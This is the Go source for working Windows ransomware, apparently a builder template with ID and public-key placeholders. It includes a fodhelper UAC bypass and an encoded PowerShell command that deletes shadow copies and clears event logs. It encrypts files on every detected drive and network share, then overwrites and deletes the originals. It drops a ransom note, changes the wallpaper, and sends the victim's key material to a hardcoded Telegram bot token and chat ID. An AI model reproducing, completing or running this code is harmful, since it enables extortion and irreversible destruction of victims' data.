package main

import (
	"bytes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/chacha20poly1305"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	_ "embed"
)

//go:embed bg.jpeg
var wallpaperData []byte

const encryptedExt = ".ling"
const myID = "{{.ID}}"

const telegramBotToken = "8377619914:AAGDSBXt-DtgqJRMFdxIxEo2NvxI9EuS5S8"
const telegramChatID = "5640449716"

var excludedDirs = map[string]struct{}{
	"$recycle.bin":              {},
	"system volume information": {},
	"windows":                   {},
	"program files":             {},
	"program files (x86)":       {},
	"programdata":               {},
	"appdata":                   {},
	"efi":                       {},
	"boot":                      {},
	"recovery":                  {},
	"perflogs":                  {},
	"msocache":                  {},
	"msys64":                    {},
	"microsoft":                 {},
	"intel":                     {},
	".gradle":                   {},
	".nuget":                    {},
	".vscode":                   {},
	".dotnet":                   {},
	"node_modules":              {},
}

var excludedExts = map[string]struct{}{
	".sys": {}, ".exe": {}, ".dll": {}, ".com": {},
	".scr": {}, ".bat": {}, ".vbs": {}, ".ps1": {},
	".msi": {}, ".inf": {}, ".reg": {}, ".ini": {},
	".lnk":       {},
	encryptedExt: {},
}

var excludedFileNames = map[string]struct{}{
	"desktop.ini":  {},
	"thumbs.db":    {},
	"bootmgr":      {},
	"bootnxt":      {},
	"pagefile.sys": {},
	"hiberfil.sys": {},
	"swapfile.sys": {},
	"autorun.inf":  {},
	"ntldr":        {},
	"ntdetect.com": {},
	"config.sys":   {},
}

// Helper untuk case-insensitive
func toLowerByte(c byte) byte {
	if c >= 'A' && c <= 'Z' {
		return c + 32
	}
	return c
}

func equalFoldASCII(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		if toLowerByte(a[i]) != toLowerByte(b[i]) {
			return false
		}
	}
	return true
}

func isExcludedDir(name string) bool {
	if len(name) > 0 && name[0] == '$' {
		return true
	}
	for key := range excludedDirs {
		if equalFoldASCII(name, key) {
			return true
		}
	}
	return false
}

func isExcludedFile(name string) bool {
	for key := range excludedFileNames {
		if equalFoldASCII(name, key) {
			return true
		}
	}
	return false
}

func isExcludedExt(ext string) bool {
	for key := range excludedExts {
		if equalFoldASCII(ext, key) {
			return true
		}
	}
	return false
}

type Stats struct {
	files     int64
	folders   int64
	skipped   int64
	errors    int64
	totalSize int64
}

func isAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}

func cleanupUACRegistry() {
	keyPath := `Software\Classes\ms-settings\Shell\Open\command`
	registry.DeleteKey(registry.CURRENT_USER, keyPath)
}

func bypassUAC() {
	if isAdmin() {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	keyPath := `Software\Classes\ms-settings\Shell\Open\command`
	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
	if err != nil {
		return
	}
	defer k.Close()
	if err := k.SetStringValue("", exe); err != nil {
		return
	}
	if err := k.SetStringValue("DelegateExecute", ""); err != nil {
		return
	}
	cmd := exec.Command("fodhelper.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()
	time.Sleep(1 * time.Second)
	os.Exit(0)
}

func deleteShadowCopies() {
	script := `Get-WmiObject Win32_ShadowCopy | Remove-WmiObject; Remove-EventLog -LogName *`
	encoded := base64.StdEncoding.EncodeToString([]byte(script))
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
	wevtutil := exec.Command("wevtutil", "cl", "Windows PowerShell")
	wevtutil.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	wevtutil.Run()
}

func secureWipe(path string, size int64) error {
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	buf := make([]byte, 64*1024)
	written := int64(0)
	for written < size {
		rand.Read(buf)
		toWrite := size - written
		if toWrite > int64(len(buf)) {
			toWrite = int64(len(buf))
		}
		n, err := f.Write(buf[:toWrite])
		if err != nil {
			return err
		}
		written += int64(n)
	}
	f.Sync()
	return nil
}

func getVolumeSerial() uint32 {
	path, _ := syscall.UTF16PtrFromString("C:\\")
	var serial uint32
	err := windows.GetVolumeInformation(path, nil, 0, &serial, nil, nil, nil, 0)
	if err != nil {
		return 0
	}
	return serial
}

func detectDrives() []string {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getLogicalDrives := kernel32.NewProc("GetLogicalDrives")
	getDriveType := kernel32.NewProc("GetDriveTypeW")

	ret, _, _ := getLogicalDrives.Call()
	bitmask := uint32(ret)

	var drives []string
	for i := 0; i < 26; i++ {
		if bitmask&(1<<uint(i)) == 0 {
			continue
		}
		letter := rune('A' + i)
		drive := fmt.Sprintf("%c:\\", letter)

		drivePtr, _ := syscall.UTF16PtrFromString(drive)
		driveType, _, _ := getDriveType.Call(uintptr(unsafe.Pointer(drivePtr)))

		switch driveType {
		case 2, 3, 4, 6:
			drives = append(drives, drive)
		}
	}
	shares := getNetworkShares()
	drives = append(drives, shares...)
	return drives
}

func getNetworkShares() []string {
	var shares []string
	cmd := exec.Command("net", "use")
	out, err := cmd.Output()
	if err != nil {
		return shares
	}
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if strings.Contains(line, "OK") {
			fields := strings.Fields(line)
			if len(fields) > 1 {
				shares = append(shares, fields[1])
			}
		}
	}
	return shares
}

func dropRansomNote() {
	note := fmt.Sprintf(`YOUR FILES HAVE BEEN ENCRYPTED!
Your unique ID: %s
To recover your data, visit: http://example.onion/%s
Do not attempt to decrypt yourself.`, myID, myID)

	for _, drive := range detectDrives() {
		path := filepath.Join(drive, "README.txt")
		os.WriteFile(path, []byte(note), 0644)
	}
}

func formatSize(b int64) string {
	const KB, MB, GB, TB = 1024, 1024 * 1024, 1024 * 1024 * 1024, 1024 * 1024 * 1024 * 1024
	switch {
	case b >= TB:
		return fmt.Sprintf("%.2f TB", float64(b)/float64(TB))
	case b >= GB:
		return fmt.Sprintf("%.2f GB", float64(b)/float64(GB))
	case b >= MB:
		return fmt.Sprintf("%.2f MB", float64(b)/float64(MB))
	case b >= KB:
		return fmt.Sprintf("%.2f KB", float64(b)/float64(KB))
	default:
		return fmt.Sprintf("%d Bytes", b)
	}
}

func formatNumber(n int64) string {
	s := fmt.Sprintf("%d", n)
	if len(s) <= 3 {
		return s
	}
	var result []byte
	for i, c := range s {
		if i > 0 && (len(s)-i)%3 == 0 {
			result = append(result, '.')
		}
		result = append(result, byte(c))
	}
	return string(result)
}

func zeroMemory(data []byte) {
	for i := range data {
		data[i] = 0
	}
	runtime.KeepAlive(data)
}

var masterPubKeyBytes = []byte{{.PublicKeyBytes}}

func isSymlink(path string) bool {
	fi, err := os.Lstat(path)
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeSymlink != 0
}

func removeReadOnly(path string) error {
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	attrs, err := syscall.GetFileAttributes(ptr)
	if err != nil {
		return err
	}
	if attrs&syscall.FILE_ATTRIBUTE_READONLY != 0 {
		return syscall.SetFileAttributes(ptr, attrs & ^uint32(syscall.FILE_ATTRIBUTE_READONLY))
	}
	return nil
}

func scanProducer(drives []string, dirChan chan<- string, wg *sync.WaitGroup, dirPending *sync.WaitGroup) {
	defer wg.Done()
	for _, drive := range drives {
		dirPending.Add(1)
		dirChan <- drive
	}
}

func dirWorker(stats *Stats, fileChan chan<- string, dirChan chan string, sem chan struct{}, wg *sync.WaitGroup, dirPending *sync.WaitGroup, filePending *sync.WaitGroup) {
	defer wg.Done()
	for path := range dirChan {
		sem <- struct{}{}
		func(p string) {
			defer dirPending.Done()
			defer func() { <-sem }()

			if isSymlink(p) {
				atomic.AddInt64(&stats.skipped, 1)
				return
			}

			entries, err := os.ReadDir(p)
			if err != nil {
				atomic.AddInt64(&stats.errors, 1)
				return
			}

			for _, entry := range entries {
				name := entry.Name()
				fullPath := filepath.Join(p, name)

				if entry.IsDir() {
					if isExcludedDir(name) {
						atomic.AddInt64(&stats.skipped, 1)
						continue
					}
					atomic.AddInt64(&stats.folders, 1)
					dirPending.Add(1)
					go func(sub string) {
						dirChan <- sub
					}(fullPath)
				} else {
					ext := filepath.Ext(name)
					if isExcludedFile(name) || isExcludedExt(ext) {
						atomic.AddInt64(&stats.skipped, 1)
						continue
					}

					info, ierr := entry.Info()
					if ierr != nil {
						atomic.AddInt64(&stats.errors, 1)
						continue
					}
					atomic.AddInt64(&stats.totalSize, info.Size())
					atomic.AddInt64(&stats.files, 1)

					filePending.Add(1)
					go func(fp string) {
						defer filePending.Done()
						fileChan <- fp
					}(fullPath)
				}
			}
		}(path)
	}
}

const chunkSize = 64 * 1024

func encryptFileStream(originalPath string, stats *Stats,
	ephPubKeyBytes []byte, aeadGembok cipher.AEAD) {

	if err := removeReadOnly(originalPath); err != nil {
		// non-fatal
	}

	success := false
	encryptedPath := originalPath + encryptedExt

	info, err := os.Stat(originalPath)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	fileSize := info.Size()

	fIn, err := os.Open(originalPath)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	defer fIn.Close()

	fOut, err := os.Create(encryptedPath)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	defer func() {
		fOut.Close()
		if !success {
			os.Remove(encryptedPath)
		}
	}()

	fileKey := make([]byte, 32)
	if _, err := rand.Read(fileKey); err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	defer zeroMemory(fileKey)

	nonceGembok := make([]byte, aeadGembok.NonceSize())
	if _, err := rand.Read(nonceGembok); err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	wrappedKey := aeadGembok.Seal(nil, nonceGembok, fileKey, nil)

	baseNonce := make([]byte, 16)
	if _, err := rand.Read(baseNonce); err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}
	header := make([]byte, 0, 32+24+48+16)
	header = append(header, ephPubKeyBytes...)
	header = append(header, nonceGembok...)
	header = append(header, wrappedKey...)
	header = append(header, baseNonce...)
	if _, err := fOut.Write(header); err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}

	aeadFile, err := chacha20poly1305.NewX(fileKey)
	if err != nil {
		atomic.AddInt64(&stats.errors, 1)
		return
	}

	buf := make([]byte, chunkSize)
	var counter uint64 = 0
	for {
		n, err := fIn.Read(buf)
		if n > 0 {
			nonce := make([]byte, 24)
			copy(nonce, baseNonce)
			binary.BigEndian.PutUint64(nonce[16:], counter)
			counter++

			ciphertext := aeadFile.Seal(nil, nonce, buf[:n], nil)
			if _, err := fOut.Write(ciphertext); err != nil {
				atomic.AddInt64(&stats.errors, 1)
				return
			}
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			atomic.AddInt64(&stats.errors, 1)
			return
		}
	}

	fIn.Close()
	fOut.Close()

	if err := secureWipe(originalPath, fileSize); err != nil {
		atomic.AddInt64(&stats.errors, 1)
	}
	if err := os.Remove(originalPath); err != nil {
		atomic.AddInt64(&stats.errors, 1)
	}

	success = true
}

func sendTelegramNotification(id string, start time.Time, files int64, totalSize int64, ephPubHex string) {
	message := fmt.Sprintf("🔐 Enkripsi Selesai!\nID Unik: %s\nWaktu: %s\nDurasi: %s\nFile: %d\nUkuran: %s\nEphemeral Public Key (hex): %s",
		id, start.Format("2006-01-02 15:04:05"), time.Since(start).Round(time.Millisecond), files, formatSize(totalSize), ephPubHex)

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
	payload := map[string]string{
		"chat_id": telegramChatID,
		"text":    message,
	}
	jsonData, _ := json.Marshal(payload)
	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}

func setWallpaper() {
	tempDir := os.TempDir()
	wallpaperPath := filepath.Join(tempDir, "wallpaper_encrypted.jpg")
	os.WriteFile(wallpaperPath, wallpaperData, 0644)

	wallpaperPtr, _ := syscall.UTF16PtrFromString(wallpaperPath)
	user32 := syscall.NewLazyDLL("user32.dll")
	proc := user32.NewProc("SystemParametersInfoW")
	const SPI_SETDESKWALLPAPER = 0x0014
	const SPIF_UPDATEINIFILE = 0x01
	const SPIF_SENDCHANGE = 0x02
	proc.Call(SPI_SETDESKWALLPAPER, 0, uintptr(unsafe.Pointer(wallpaperPtr)), SPIF_UPDATEINIFILE|SPIF_SENDCHANGE)
}

func main() {
	if !isAdmin() {
		bypassUAC()
		os.Exit(0)
	}
	cleanupUACRegistry()
	deleteShadowCopies()

	numCPU := runtime.NumCPU()
	runtime.GOMAXPROCS(numCPU)
	workerCount := numCPU * 2
	fileChan := make(chan string, 1000)
	dirChan := make(chan string, 1000)

	masterPubKey, err := ecdh.X25519().NewPublicKey(masterPubKeyBytes)
	if err != nil {
		panic("Invalid master public key")
	}
	ephPriv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		panic("Failed to generate ephemeral key")
	}
	ephPubBytes := ephPriv.PublicKey().Bytes()
	sharedSecret, err := ephPriv.ECDH(masterPubKey)
	if err != nil {
		panic("ECDH failed")
	}
	defer zeroMemory(sharedSecret)

	aeadGembok, err := chacha20poly1305.NewX(sharedSecret)
	if err != nil {
		panic("Failed to create AEAD wrapper")
	}

	fmt.Println(strings.Repeat("═", 50))
	fmt.Println("   ENCRYPTOR ENGINE — Professional Edition")
	fmt.Println(strings.Repeat("═", 50))
	fmt.Printf("CPU Cores : %d\n", numCPU)
	fmt.Printf("Workers   : %d\n", workerCount)
	fmt.Printf("Extension : %s\n", encryptedExt)
	fmt.Printf("Mulai     : %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Println(strings.Repeat("─", 50))

	start := time.Now()
	stats := &Stats{}

	var consumerWg sync.WaitGroup
	for i := 0; i < workerCount; i++ {
		consumerWg.Add(1)
		go func() {
			defer consumerWg.Done()
			for fpath := range fileChan {
				encryptFileStream(fpath, stats, ephPubBytes, aeadGembok)
			}
		}()
	}

	var producerWg sync.WaitGroup
	var dirPending sync.WaitGroup
	var filePending sync.WaitGroup

	drives := detectDrives()
	producerWg.Add(1)
	go scanProducer(drives, dirChan, &producerWg, &dirPending)

	go func() {
		producerWg.Wait()
		dirPending.Wait()
		close(dirChan)
	}()

	var dirWg sync.WaitGroup
	sem := make(chan struct{}, numCPU*2)
	for i := 0; i < workerCount; i++ {
		dirWg.Add(1)
		go dirWorker(stats, fileChan, dirChan, sem, &dirWg, &dirPending, &filePending)
	}

	dirWg.Wait()
	filePending.Wait()
	close(fileChan)

	consumerWg.Wait()

	dropRansomNote()

	elapsed := time.Since(start)

	fmt.Println()
	fmt.Println(strings.Repeat("═", 50))
	fmt.Println("               HASIL ENKRIPSI")
	fmt.Println(strings.Repeat("═", 50))
	fmt.Printf("  File dienkripsi : %s\n", formatNumber(atomic.LoadInt64(&stats.files)))
	fmt.Printf("  Total Folder    : %s\n", formatNumber(atomic.LoadInt64(&stats.folders)))
	fmt.Printf("  Total Ukuran    : %s\n", formatSize(atomic.LoadInt64(&stats.totalSize)))
	fmt.Printf("  Dilewati        : %s path\n", formatNumber(atomic.LoadInt64(&stats.skipped)))
	fmt.Printf("  Error           : %s\n", formatNumber(atomic.LoadInt64(&stats.errors)))
	fmt.Printf("  Durasi          : %s\n", elapsed.Round(time.Millisecond))
	fmt.Println(strings.Repeat("═", 50))

	ephPubHex := hex.EncodeToString(ephPubBytes)
	sendTelegramNotification(myID, start, atomic.LoadInt64(&stats.files), atomic.LoadInt64(&stats.totalSize), ephPubHex)

	setWallpaper()
}